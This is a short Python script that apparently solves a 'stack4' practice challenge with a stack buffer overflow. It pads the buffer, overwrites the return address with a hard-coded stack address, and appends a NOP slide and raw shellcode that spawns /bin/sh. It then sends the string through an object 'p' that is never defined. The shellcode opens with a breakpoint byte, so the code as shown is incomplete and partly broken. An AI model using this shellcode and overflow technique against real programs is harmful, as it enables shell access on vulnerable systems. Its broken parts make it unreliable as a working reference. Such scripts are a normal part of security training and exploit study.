# stack4ex.py - Aidan Wech (Onyxymous)
import struct
import sys

# exploit string variables
offset = b'a' * 40				# buffsize
rip = struct.pack("L", 0x7fffffffe480+30)	# address of rip that controls where to put the payload on the stack, I used the stack pointer address plus 8 bytes to manipulate the stack
nop = b'\x90' * 200				# no operation slide, which puts us in a more open place on the stack
payload = b"\xCC\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh"
						# payload of our exploit that executes a shell
exploit = offset + rip + nop + payload 		# exploit string

p.sendline(exploit)
